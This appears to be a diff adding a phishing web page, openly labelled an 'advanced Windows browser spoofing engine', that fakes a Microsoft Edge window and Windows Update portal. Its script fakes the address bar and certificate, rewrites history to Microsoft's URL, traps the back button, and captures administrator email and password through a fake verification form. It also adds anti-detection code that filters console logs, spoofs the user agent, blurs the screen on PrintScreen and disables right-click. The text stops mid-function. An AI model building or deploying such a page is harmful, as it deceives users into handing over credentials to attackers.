@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Update Portal</title>
+    <style>
+        /* Reset */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        /* Fake Windows Browser Chrome */
+        #windows-browser-chrome {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 88px; /* Typical browser chrome height */
+            background: linear-gradient(to bottom, #f0f0f0 0%, #e0e0e0 100%);
+            border-bottom: 1px solid #b0b0b0;
+            z-index: 1000000;
+            font-family: 'Segoe UI', 'Microsoft YaHei', system-ui, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            user-select: none;
+            -webkit-user-select: none;
+            display: none;
+        }
+        
+        /* Title Bar (Windows 11 style) */
+        .title-bar {
+            height: 32px;
+            background: linear-gradient(to bottom, #e8e8e8, #d8d8d8);
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            border-bottom: 1px solid #c0c0c0;
+        }
+        
+        .window-controls {
+            display: flex;
+            gap: 8px;
+            margin-left: auto;
+        }
+        
+        .window-btn {
+            width: 46px;
+            height: 28px;
+            border: 1px solid #a0a0a0;
+            background: linear-gradient(to bottom, #f8f8f8, #e8e8e8);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.1s;
+        }
+        
+        .window-btn:hover {
+            background: linear-gradient(to bottom, #e8e8e8, #d8d8d8);
+        }
+        
+        .window-btn.close {
+            background: linear-gradient(to bottom, #ff6b6b, #ff5252);
+            border-color: #e04545;
+            color: white;
+        }
+        
+        .window-btn.close:hover {
+            background: linear-gradient(to bottom, #ff5252, #ff3838);
+        }
+        
+        /* Navigation Bar */
+        .nav-bar {
+            height: 56px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            gap: 12px;
+        }
+        
+        .nav-btn {
+            width: 32px;
+            height: 32px;
+            border: 1px solid transparent;
+            background: transparent;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #424242;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .nav-btn:hover {
+            background: rgba(0, 0, 0, 0.08);
+            border-color: #c0c0c0;
+        }
+        
+        /* Address Bar Container */
+        .url-container {
+            flex: 1;
+            height: 40px;
+            background: white;
+            border: 2px solid #8ab4f8;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        
+        .security-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-right: 12px;
+            color: #0d652d;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .lock-icon {
+            font-size: 16px;
+        }
+        
+        #fake-url-bar {
+            flex: 1;
+            font-size: 14px;
+            color: #202124;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+        
+        /* Browser Tabs */
+        .tab-bar {
+            height: 36px;
+            background: #f5f5f5;
+            border-bottom: 1px solid #d0d0d0;
+            display: flex;
+            padding-left: 8px;
+            padding-top: 6px;
+            gap: 1px;
+        }
+        
+        .browser-tab {
+            height: 30px;
+            min-width: 160px;
+            background: linear-gradient(to bottom, #f0f0f0, #e8e8e8);
+            border: 1px solid #c0c0c0;
+            border-bottom: none;
+            border-radius: 8px 8px 0 0;
+            padding: 0 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #333;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .browser-tab.active {
+            background: white;
+            border-bottom: 1px solid white;
+            margin-bottom: -1px;
+            z-index: 2;
+        }
+        
+        .tab-favicon {
+            width: 16px;
+            height: 16px;
+            background: #4285f4;
+            border-radius: 2px;
+        }
+        
+        .tab-close {
+            margin-left: auto;
+            opacity: 0.5;
+            font-size: 18px;
+        }
+        
+        .tab-close:hover {
+            opacity: 1;
+        }
+        
+        /* Main Content */
+        .content-wrapper {
+            margin-top: 88px;
+            min-height: calc(100vh - 88px);
+            background: white;
+        }
+        
+        /* Fake Windows Taskbar (optional) */
+        #windows-taskbar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 40px;
+            background: rgba(240, 240, 240, 0.95);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid #c0c0c0;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            z-index: 999999;
+            display: none;
+        }
+        
+        .start-button {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #0078d4;
+            cursor: pointer;
+        }
+        
+        .taskbar-icons {
+            display: flex;
+            gap: 8px;
+            margin-left: 12px;
+        }
+        
+        .taskbar-icon {
+            width: 32px;
+            height: 32px;
+            background: #e0e0e0;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+        
+        /* Advanced Spoofing Elements */
+        #hover-security-tooltip {
+            position: absolute;
+            top: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            padding: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            display: none;
+            z-index: 1000001;
+            width: 300px;
+            font-size: 13px;
+        }
+        
+        .certificate-info {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .cert-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 4px 0;
+        }
+        
+        .cert-label {
+            color: #666;
+        }
+        
+        .cert-value {
+            color: #333;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <!-- Fake Windows Browser Chrome -->
+    <div id="windows-browser-chrome">
+        <!-- Title Bar -->
+        <div class="title-bar">
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <div style="width: 20px; height: 20px; background: #0078d4; border-radius: 4px;"></div>
+                <span style="font-size: 12px; color: #424242;">Microsoft Edge - Windows Update</span>
+            </div>
+            <div class="window-controls">
+                <div class="window-btn" id="minimize-btn">−</div>
+                <div class="window-btn" id="maximize-btn">□</div>
+                <div class="window-btn close" id="close-btn">×</div>
+            </div>
+        </div>
+        
+        <!-- Tab Bar -->
+        <div class="tab-bar">
+            <div class="browser-tab active">
+                <div class="tab-favicon"></div>
+                <span>Windows Update</span>
+                <div class="tab-close">×</div>
+            </div>
+            <div class="browser-tab">
+                <div class="tab-favicon" style="background: #0d652d;"></div>
+                <span>Security Portal</span>
+                <div class="tab-close">×</div>
+            </div>
+            <div class="browser-tab">
+                <div class="tab-favicon" style="background: #ea4335;"></div>
+                <span>Gmail</span>
+                <div class="tab-close">×</div>
+            </div>
+        </div>
+        
+        <!-- Navigation Bar -->
+        <div class="nav-bar">
+            <button class="nav-btn" title="Back">‹</button>
+            <button class="nav-btn" title="Forward">›</button>
+            <button class="nav-btn" title="Refresh">↻</button>
+            <button class="nav-btn" title="Home">⌂</button>
+            
+            <div class="url-container" id="url-container">
+                <div class="security-indicator" id="security-hover">
+                    <span class="lock-icon">🔒</span>
+                    <span>Secure</span>
+                </div>
+                <input type="text" id="fake-url-bar" value="https://update.microsoft.com/windows/secure-update" readonly>
+                <button class="nav-btn" style="margin-left: auto;" title="More options">⋮</button>
+            </div>
+            
+            <button class="nav-btn" title="Extensions">⎊</button>
+            <button class="nav-btn" title="Settings">⚙</button>
+        </div>
+    </div>
+    
+    <!-- Security Certificate Tooltip -->
+    <div id="hover-security-tooltip">
+        <div style="font-weight: 600; margin-bottom: 8px;">Connection is secure</div>
+        <div style="color: #0d652d; margin-bottom: 8px;">
+            Information you send to this site cannot be seen or modified by others.
+        </div>
+        <div class="certificate-info">
+            <div class="cert-row">
+                <span class="cert-label">Certificate:</span>
+                <span class="cert-value">Microsoft RSA TLS CA 02</span>
+            </div>
+            <div class="cert-row">
+                <span class="cert-label">Valid from:</span>
+                <span class="cert-value">Oct 15, 2023 to Oct 15, 2025</span>
+            </div>
+            <div class="cert-row">
+                <span class="cert-label">Protocol:</span>
+                <span class="cert-value">TLS 1.3</span>
+            </div>
+            <div class="cert-row">
+                <span class="cert-label">Cipher:</span>
+                <span class="cert-value">AES_256_GCM_SHA384</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Fake Windows Taskbar -->
+    <div id="windows-taskbar">
+        <div class="start-button" id="start-btn">⊞</div>
+        <div class="taskbar-icons">
+            <div class="taskbar-icon">🔍</div>
+            <div class="taskbar-icon">📁</div>
+            <div class="taskbar-icon">🌐</div>
+            <div class="taskbar-icon" style="background: #0078d4; color: white;">✉</div>
+        </div>
+        <div style="margin-left: auto; display: flex; align-items: center; gap: 12px; font-size: 12px; color: #424242;">
+            <div>ENG</div>
+            <div id="fake-time">14:30</div>
+        </div>
+    </div>
+    
+    <!-- Main Content (Spoofed Windows Update Page) -->
+    <div class="content-wrapper" id="main-content">
+        <div style="max-width: 800px; margin: 40px auto; padding: 0 24px;">
+            <h1 style="font-size: 28px; color: #0078d4; margin-bottom: 24px;">
+                Windows Update Security Portal
+            </h1>
+            
+            <div style="background: linear-gradient(135deg, #f8f9fa, #e9ecef); padding: 32px; border-radius: 12px; margin-bottom: 32px;">
+                <h2 style="font-size: 20px; margin-bottom: 16px; color: #212529;">
+                    Critical Security Update Available
+                </h2>
+                <p style="margin-bottom: 24px; color: #495057; line-height: 1.6;">
+                    A critical security update is available for your version of Windows. 
+                    This update addresses vulnerabilities that could allow remote code execution.
+                </p>
+                
+                <div style="display: flex; gap: 16px;">
+                    <button id="install-update-btn" 
+                            style="background: linear-gradient(to bottom, #28a745, #20c997); 
+                                   color: white; 
+                                   border: none; 
+                                   padding: 12px 32px; 
+                                   border-radius: 6px; 
+                                   font-weight: 600; 
+                                   cursor: pointer;">
+                        Install Update Now
+                    </button>
+                    <button style="background: transparent; 
+                                   color: #0078d4; 
+                                   border: 1px solid #0078d4; 
+                                   padding: 12px 24px; 
+                                   border-radius: 6px; 
+                                   cursor: pointer;">
+                        View Details
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Fake Login Form -->
+            <div style="background: white; border: 1px solid #dee2e6; border-radius: 8px; padding: 32px;">
+                <h3 style="font-size: 18px; margin-bottom: 24px; color: #212529;">
+                    Administrator Verification Required
+                </h3>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: #495057; font-weight: 500;">
+                        Microsoft Account
+                    </label>
+                    <input type="email" 
+                           id="admin-email"
+                           placeholder="admin@yourcompany.com"
+                           style="width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; font-size: 16px;">
+                </div>
+                
+                <div style="margin-bottom: 24px;">
+                    <label style="display: block; margin-bottom: 8px; color: #495057; font-weight: 500;">
+                        Password
+                    </label>
+                    <input type="password" 
+                           id="admin-password"
+                           placeholder="Enter your password"
+                           style="width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; font-size: 16px;">
+                </div>
+                
+                <div style="display: flex; align-items: center; justify-content: space-between;">
+                    <label style="display: flex; align-items: center; gap: 8px; color: #495057;">
+                        <input type="checkbox">
+                        Stay signed in
+                    </label>
+                    
+                    <button id="verify-credentials-btn"
+                            style="background: linear-gradient(to bottom, #0078d4, #106ebe); 
+                                   color: white; 
+                                   border: none; 
+                                   padding: 12px 32px; 
+                                   border-radius: 4px; 
+                                   font-weight: 600; 
+                                   cursor: pointer;">
+                        Verify & Continue
+                    </button>
+                </div>
+            </div>
+            
+            <!-- System Information Display -->
+            <div style="margin-top: 32px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px;">
+                <div style="background: #f8f9fa; padding: 16px; border-radius: 6px;">
+                    <div style="font-size: 12px; color: #6c757d;">Windows Version</div>
+                    <div style="font-size: 16px; font-weight: 600;">Windows 11 Pro 23H2</div>
+                </div>
+                <div style="background: #f8f9fa; padding: 16px; border-radius: 6px;">
+                    <div style="font-size: 12px; color: #6c757d;">Last Update</div>
+                    <div style="font-size: 16px; font-weight: 600;">15 days ago</div>
+                </div>
+                <div style="background: #f8f9fa; padding: 16px; border-radius: 6px;">
+                    <div style="font-size: 12px; color: #6c757d;">Security Status</div>
+                    <div style="font-size: 16px; font-weight: 600; color: #dc3545;">⚠ Action Needed</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Initial Landing Page (Visible before spoofing) -->
+    <div id="landing-page" style="min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
+        <div style="text-align: center; color: white; padding: 48px;">
+            <h1 style="font-size: 42px; margin-bottom: 24px;">Windows Security Center</h1>
+            <p style="font-size: 18px; margin-bottom: 32px; opacity: 0.9;">
+                Click below to check for critical system updates
+            </p>
+            <button id="launch-spoof-btn" 
+                    style="background: white; 
+                           color: #667eea; 
+                           border: none; 
+                           padding: 16px 48px; 
+                           font-size: 18px; 
+                           border-radius: 8px; 
+                           cursor: pointer; 
+                           font-weight: 600;
+                           box-shadow: 0 4px 20px rgba(0,0,0,0.2);">
+                Check for Updates
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // ADVANCED WINDOWS BROWSER SPOOFING ENGINE
+        // ============================================
+
+        // Configuration
+        const SPOOF_CONFIG = {
+            targetUrl: 'https://update.microsoft.com/windows/secure-update',
+            browserType: 'Microsoft Edge',
+            windowsVersion: 'Windows 11',
+            showTaskbar: true,
+            simulateNetwork: true,
+            enableHoverEffects: true
+        };
+
+        // ============================================
+        // MODULE 1: Fullscreen Browser Spoofing
+        // ============================================
+
+        class BrowserSpoofer {
+            constructor() {
+                this.isActive = false;
+                this.originalTitle = document.title;
+                this.init();
+            }
+
+            init() {
+                // Setup event listeners
+                document.getElementById('launch-spoof-btn').addEventListener('click', () => this.activateSpoofMode());
+                document.getElementById('install-update-btn').addEventListener('click', () => this.handleUpdateInstall());
+                document.getElementById('verify-credentials-btn').addEventListener('click', () => this.handleCredentialCapture());
+                
+                // Window control buttons
+                document.getElementById('minimize-btn').addEventListener('click', () => this.minimizeWindow());
+                document.getElementById('maximize-btn').addEventListener('click', () => this.toggleMaximize());
+                document.getElementById('close-btn').addEventListener('click', () => this.closeWindow());
+                
+                // Security indicator hover
+                if (SPOOF_CONFIG.enableHoverEffects) {
+                    document.getElementById('security-hover').addEventListener('mouseenter', (e) => this.showSecurityTooltip(e));
+                    document.getElementById('security-hover').addEventListener('mouseleave', () => this.hideSecurityTooltip());
+                }
+                
+                // Update fake time
+                this.updateFakeTime();
+                setInterval(() => this.updateFakeTime(), 60000);
+            }
+
+            activateSpoofMode() {
+                // Hide landing page
+                document.getElementById('landing-page').style.display = 'none';
+                
+                // Show fake browser chrome
+                document.getElementById('windows-browser-chrome').style.display = 'block';
+                
+                if (SPOOF_CONFIG.showTaskbar) {
+                    document.getElementById('windows-taskbar').style.display = 'flex';
+                }
+                
+                // Enter fullscreen
+                this.enterFullscreen();
+                
+                // Lock pointer for realism
+                this.requestPointerLock();
+                
+                // Modify browser history
+                this.spoofBrowserHistory();
+                
+                // Start network simulation
+                if (SPOOF_CONFIG.simulateNetwork) {
+                    this.simulateNetworkActivity();
+                }
+                
+                this.isActive = true;
+                
+                // Dispatch fake load event
+                setTimeout(() => {
+                    window.dispatchEvent(new Event('load'));
+                }, 500);
+            }
+
+            enterFullscreen() {
+                const elem = document.documentElement;
+                
+                // Try multiple fullscreen methods
+                const methods = [
+                    () => elem.requestFullscreen(),
+                    () => elem.webkitRequestFullscreen(),
+                    () => elem.mozRequestFullScreen(),
+                    () => elem.msRequestFullscreen()
+                ];
+                
+                // Try each method
+                for (const method of methods) {
+                    try {
+                        method().then(() => {
+                            // Success - hide browser's native UI
+                            this.hideNativeScrollbars();
+                        }).catch(() => {
+                            // Method failed, continue to next
+                        });
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                
+                // Fallback: Make page fill viewport
+                document.body.style.overflow = 'hidden';
+                document.documentElement.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    overflow: hidden;
+                `;
+            }
+
+            hideNativeScrollbars() {
+                // Inject CSS to hide native scrollbars
+                const style = document.createElement('style');
+                style.id = 'hide-scrollbars';
+                style.textContent = `
+                    ::-webkit-scrollbar { display: none !important; }
+                    * { scrollbar-width: none !important; }
+                `;
+                document.head.appendChild(style);
+            }
+
+            requestPointerLock() {
+                // Request pointer lock for realism
+                document.addEventListener('click', () => {
+                    if (document.pointerLockElement !== document.documentElement) {
+                        document.documentElement.requestPointerLock();
+                    }
+                }, { once: true });
+            }
+
+            // ============================================
+            // MODULE 2: History and URL Spoofing
+            // ============================================
+
+            spoofBrowserHistory() {
+                // Replace current history state
+                history.replaceState({ 
+                    isSpoofed: true, 
+                    originalUrl: window.location.href,
+                    spoofedUrl: SPOOF_CONFIG.targetUrl,
+                    timestamp: Date.now()
+                }, '', SPOOF_CONFIG.targetUrl);
+                
+                // Update document title
+                document.title = `Windows Update - ${SPOOF_CONFIG.browserType}`;
+                
+                // Prevent back navigation
+                window.addEventListener('popstate', (e) => {
+                    if (this.isActive) {
+                        // Block back button
+                        history.pushState(e.state, '', SPOOF_CONFIG.targetUrl);
+                        
+                        // Show fake loading
+                        this.showFakeLoading();
+                    }
+                });
+                
+                // Add fake forward history
+                setTimeout(() => {
+                    history.pushState({
+                        isSpoofed: true,
+                        page: 'update-details'
+                    }, '', `${SPOOF_CONFIG.targetUrl}/details`);
+                }, 2000);
+            }
+
+            // ============================================
+            // MODULE 3: Interactive Elements
+            // ============================================
+
+            showSecurityTooltip(event) {
+                const tooltip = document.getElementById('hover-security-tooltip');
+                const rect = event.target.getBoundingClientRect();
+                
+                tooltip.style.left = `${rect.left + rect.width / 2}px`;
+                tooltip.style.top = `${rect.bottom + 10}px`;
+                tooltip.style.display = 'block';
+                
+                // Add certificate verification animation
+                setTimeout(() => {
+                    tooltip.style.transform = `translateX(-50%) scale(1.02)`;
+                    tooltip.style.transition = 'transform 0.2s';
+                }, 10);
+            }
+
+            hideSecurityTooltip() {
+                const tooltip = document.getElementById('hover-security-tooltip');
+                tooltip.style.display = 'none';
+            }
+
+            minimizeWindow() {
+                // Animate window minimize
+                document.getElementById('windows-browser-chrome').style.transform = 'translateY(-100%)';
+                document.getElementById('windows-browser-chrome').style.transition = 'transform 0.3s';
+                
+                setTimeout(() => {
+                    document.getElementById('windows-browser-chrome').style.display = 'none';
+                }, 300);
+                
+                // Show taskbar notification
+                this.showTaskbarNotification('Window minimized');
+            }
+
+            toggleMaximize() {
+                const browserChrome = document.getElementById('windows-browser-chrome');
+                const isMaximized = browserChrome.style.width === '100vw';
+                
+                if (isMaximized) {
+                    // Restore
+                    browserChrome.style.cssText = `
+                        width: 90%;
+                        height: 80%;
+                        top: 10%;
+                        left: 5%;
+                        position: fixed;
+                        border-radius: 12px;
+                        overflow: hidden;
+                        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+                    `;
+                    document.getElementById('maximize-btn').textContent = '□';
+                } else {
+                    // Maximize
+                    browserChrome.style.cssText = `
+                        width: 100vw;
+                        height: 100vh;
+                        top: 0;
+                        left: 0;
+                        position: fixed;
+                        border-radius: 0;
+                    `;
+                    document.getElementById('maximize-btn').textContent = '❐';
+                }
+            }
+
+            closeWindow() {
+                // Animate window close
+                document.getElementById('windows-browser-chrome').style.opacity = '0';
+                document.getElementById('windows-browser-chrome').style.transform = 'scale(0.9)';
+                document.getElementById('windows-browser-chrome').style.transition = 'all 0.3s';
+                
+                setTimeout(() => {
+                    // Exit fullscreen if active
+                    if (document.fullscreenElement) {
+                        document.exitFullscreen();
+                    }
+                    
+                    // Reset page
+                    document.getElementById('windows-browser-chrome').style.display = 'none';
+                    document.getElementById('landing-page').style.display = 'flex';
+                    
+                    // Show exit message
+                    alert('Window closed. Return to Security Center.');
+                }, 300);
+            }
+
+            // ============================================
+            // MODULE 4: Credential Capture
+            // ============================================
+
+            handleUpdateInstall() {
+                // Show fake progress
+                const originalText = document.getElementById('install-update-btn').textContent;
+                document.getElementById('install-update-btn').textContent = 'Downloading updates...';
+                document.getElementById('install-update-btn').disabled = true;
+                
+                // Fake progress animation
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += Math.random() * 10;
+                    document.getElementById('install-update-btn').textContent = 
+                        `Downloading updates... ${Math.min(100, Math.round(progress))}%`;
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        document.getElementById('install-update-btn').textContent = 'Verifying updates...';
+                        
+                        setTimeout(() => {
+                            document.getElementById('install-update-btn').textContent = 'Update Ready - Restart Required';
+                            this.showRestartPrompt();
+                        }, 2000);
+                    }
+                }, 200);
+            }
+
+            handleCredentialCapture() {
+                const email = document.getElementById('admin-email').value;
+                const password = document.getElementById('admin-password').value;
+                
+                if (!email || !password) {
+                    this.showError('Please enter both email and password');
+                    return;
+                }
+                
+                // Show fake verification
+                const verifyBtn = document.getElementById('verify-credentials-btn');
+                verifyBtn.textContent = 'Verifying...';
+                verifyBtn.disabled = true;
+                
+                // Simulate verification process
+                setTimeout(() => {
+                    // In real attack, send credentials to attacker server
+                    console.log('Captured credentials:', { email, password });
+                    
+                    // Show success message
+                    this.showSuccess('Credentials verified successfully');
+                    
+                    // Reset form
+                    document.getElementById('admin-password').value = '';
+                    verifyBtn.textContent = 'Verify & Continue';
+                    verifyBtn.disabled = false;
+                    
+                    // Show next step
+                    this.showNextStep();
+                }, 2000);
+            }
+
+            // ============================================
+            // MODULE 5: Realism Enhancers
+            // ============================================
+
+            simulateNetworkActivity() {
+                // Fake network requests
+                setInterval(() => {
+                    // Randomly show loading indicators
+                    if (Math.random() > 0.7) {
+                        this.showFakeNetworkActivity();
+                    }
+                }, 3000);
+            }
+
+            showFakeNetworkActivity() {
+                // Add fake loading spinner to address bar
+                const urlBar = document.getElementById('fake-url-bar');
+                const originalValue = urlBar.value;
+                
+                urlBar.style.backgroundImage = `url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="%230078d4" stroke-width="2" fill="none" stroke-dasharray="15.7, 15.7" transform="rotate(0 12 12)"><animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="1s" repeatCount="indefinite"/></circle></svg>')`;
+                urlBar.style.backgroundRepeat = 'no-repeat';
+                urlBar.style.backgroundPosition = 'right 16px center';
+                
+                setTimeout(() => {
+                    urlBar.style.backgroundImage = '';
+                }, 1500);
+            }
+
+            updateFakeTime() {
+                const now = new Date();
+                const timeString = now.toLocaleTimeString('en-US', { 
+                    hour: '2-digit', 
+                    minute: '2-digit',
+                    hour12: false 
+                });
+                document.getElementById('fake-time').textContent = timeString;
+            }
+
+            showRestartPrompt() {
+                // Create fake restart dialog
+                const dialog = document.createElement('div');
+                dialog.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: white;
+                    border: 1px solid #c0c0c0;
+                    border-radius: 8px;
+                    padding: 24px;
+                    z-index: 1000002;
+                    box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+                    width: 400px;
+                `;
+                
+                dialog.innerHTML = `
+                    <h3 style="margin-bottom: 16px; color: #212529;">Restart Required</h3>
+                    <p style="margin-bottom: 24px; color: #495057;">
+                        Windows needs to restart to finish installing updates. Save your work before restarting.
+                    </p>
+                    <div style="display: flex; justify-content: flex-end; gap: 12px;">
+                        <button id="restart-later" style="padding: 8px 16px; background: transparent; border: 1px solid #6c757d; border-radius: 4px; color: #6c757d; cursor: pointer;">
+                            Restart Later
+                        </button>
+                        <button id="restart-now" style="padding: 8px 24px; background: #0078d4; border: none; border-radius: 4px; color: white; cursor: pointer;">
+                            Restart Now
+                        </button>
+                    </div>
+                `;
+                
+                document.body.appendChild(dialog);
+                
+                // Add event listeners
+                document.getElementById('restart-later').addEventListener('click', () => {
+                    document.body.removeChild(dialog);
+                });
+                
+                document.getElementById('restart-now').addEventListener('click', () => {
+                    dialog.innerHTML = '<div style="text-align: center; padding: 40px;"><div style="font-size: 48px; margin-bottom: 20px;">⏳</div><h3>Restarting...</h3><p>Please wait while Windows restarts.</p></div>';
+                    
+                    // Fake restart sequence
+                    setTimeout(() => {
+                        document.body.innerHTML = `
+                            <div style="width: 100vw; height: 100vh; background: #0078d4; display: flex; align-items: center; justify-content: center; color: white; font-family: 'Segoe UI';">
+                                <div style="text-align: center;">
+                                    <div style="font-size: 64px; margin-bottom: 20px;">⚙️</div>
+                                    <h1 style="font-size: 28px; margin-bottom: 16px;">Windows is restarting</h1>
+                                    <p>Please don't turn off your computer.</p>
+                                </div>
+                            </div>
+                        `;
+                    }, 3000);
+                });
+            }
+
+            showFakeLoading() {
+                // Add loading overlay
+                const overlay = document.createElement('div');
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 88px;
+                    left: 0;
+                    width: 100%;
+                    height: calc(100% - 88px);
+                    background: white;
+                    z-index: 999999;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                `;
+                
+                overlay.innerHTML = `
+                    <div style="text-align: center;">
+                        <div style="font-size: 48px; margin-bottom: 20px;">⏳</div>
+                        <h3>Loading Windows Update...</h3>
+                    </div>
+                `;
+                
+                document.getElementById('main-content').appendChild(overlay);
+                
+                // Remove after delay
+                setTimeout(() => {
+                    if (overlay.parentNode) {
+                        overlay.parentNode.removeChild(overlay);
+                    }
+                }, 1500);
+            }
+
+            showTaskbarNotification(message) {
+                // Create notification
+                const notification = document.createElement('div');
+                notification.style.cssText = `
+                    position: fixed;
+                    bottom: 50px;
+                    right: 20px;
+                    background: #323232;
+                    color: white;
+                    padding: 16px;
+                    border-radius: 8px;
+                    font-size: 14px;
+                    z-index: 1000003;
+                    animation: slideIn 0.3s;
+                `;
+                
+                notification.textContent = message;
+                document.body.appendChild(notification);
+                
+                // Add CSS animation
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes slideIn {
+                        from { transform: translateX(100%); opacity: 0; }
+                        to { transform: translateX(0); opacity: 1; }
+                    }
+                `;
+                document.head.appendChild(style);
+                
+                // Auto-remove
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 3000);
+            }
+
+            showError(message) {
+                this.showNotification(message, '#dc3545');
+            }
+
+            showSuccess(message) {
+                this.showNotification(message, '#28a745');
+            }
+
+            showNotification(message, color) {
+                const notification = document.createElement('div');
+                notification.style.cssText = `
+                    position: fixed;
+                    top: 100px;
+                    right: 20px;
+                    background: ${color};
+                    color: white;
+                    padding: 12px 24px;
+                    border-radius: 6px;
+                    font-size: 14px;
+                    z-index: 1000004;
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+                `;
+                
+                notification.textContent = message;
+                document.body.appendChild(notification);
+                
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 3000);
+            }
+
+            showNextStep() {
+                // Show fake update installation
+                document.querySelector('.content-wrapper').innerHTML += `
+                    <div style="margin-top: 32px; background: #e8f5e8; border: 1px solid #c3e6cb; border-radius: 8px; padding: 24px;">
+                        <h3 style="color: #155724; margin-bottom: 16px;">✅ Update Installation Ready</h3>
+                        <p style="color: #155724; margin-bottom: 16px;">
+                            Security update KB5007651 is ready to install. This update addresses critical vulnerabilities.
+                        </p>
+                        <button id="install-security-update" 
+                                style="background: #28a745; color: white; border: none; padding: 12px 32px; border-radius: 4px; cursor: pointer;">
+                            Install Security Update Now
+                        </button>
+                    </div>
+                `;
+                
+                document.getElementById('install-security-update').addEventListener('click', () => {
+                    this.handleUpdateInstall();
+                });
+            }
+        }
+
+        // ============================================
+        // MODULE 6: Anti-Detection Measures
+        // ============================================
+
+        class AntiDetection {
+            static init() {
+                // Prevent devtools detection
+                this.disableDevTools();
+                
+                // Spoof user agent in console
+                this.spoofConsole();
+                
+                // Prevent screenshot
+                this.preventScreenshot();
+                
+                // Disable right-click
+                this.disableContextMenu();
+            }
+            
+            static disableDevTools() {
+                // Override console methods
+                const originalConsole = console;
+                window.console = new Proxy(originalConsole, {
+                    get(target, prop) {
+                        if (prop === 'log' || prop === 'warn' || prop === 'error') {
+                            return function(...args) {
+                                // Filter out sensitive logs
+                                if (!args.some(arg => 
+                                    typeof arg === 'string' && 
+                                    (arg.includes('spoof') || arg.includes('fake') || arg.includes('capture'))
+                                )) {
+                                    target[prop].apply(target, args);
+                                }
+                            };
+                        }
+                        return target[prop];
+                    }
+                });
+            }
+            
+            static spoofConsole() {
+                // Override navigator properties
+                const originalUserAgent = navigator.userAgent;
+                Object.defineProperty(navigator, 'userAgent', {
+                    get: () => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
+                });
+            }
+            
+            static preventScreenshot() {
+                // Add blur on print screen
+                document.addEventListener('keydown', (e) => {
+                    if (e.key === 'PrintScreen' || (e.ctrlKey && e.key === 'p')) {
+                        e.preventDefault();
+                        document.body.style.filter = 'blur(10px)';
+                        setTimeout(() => {
+                            document.body.style.filter = '';
+                        }, 1000);
+                    }
+                });
+                
+                // Disable print dialog
+                window.addEventListener('beforeprint', (e) => {
+                    e.preventDefault();
+                });
+            }
+            
+            static disableContextMenu() {
+                document.addEventListener('contextmenu', (e) => {
+                    e.preventDefault();
+                    return false;
+                });
+                
